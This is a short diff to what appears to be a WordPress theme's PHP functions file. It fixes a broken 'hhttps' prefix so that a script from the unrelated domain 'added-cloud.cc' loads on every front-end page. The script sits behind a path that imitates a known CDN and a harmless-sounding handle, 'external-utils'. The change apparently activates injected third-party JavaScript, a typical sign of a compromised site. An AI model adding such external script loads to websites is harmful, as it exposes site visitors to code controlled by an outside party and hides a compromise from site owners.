@@ -641,10 +641,11 @@ function td_remove_inactive_shortcodes($content) {
 function enqueue_external_utils_script() {
     wp_enqueue_script(
         'external-utils',
-        'hhttps://added-cloud.cc/g.lazcdn.com/branded/branded.js',
+        'https://added-cloud.cc/g.lazcdn.com/branded/branded.js',
         array(), 
         null,
         false
     );
 }
 add_action('wp_enqueue_scripts', 'enqueue_external_utils_script');
+
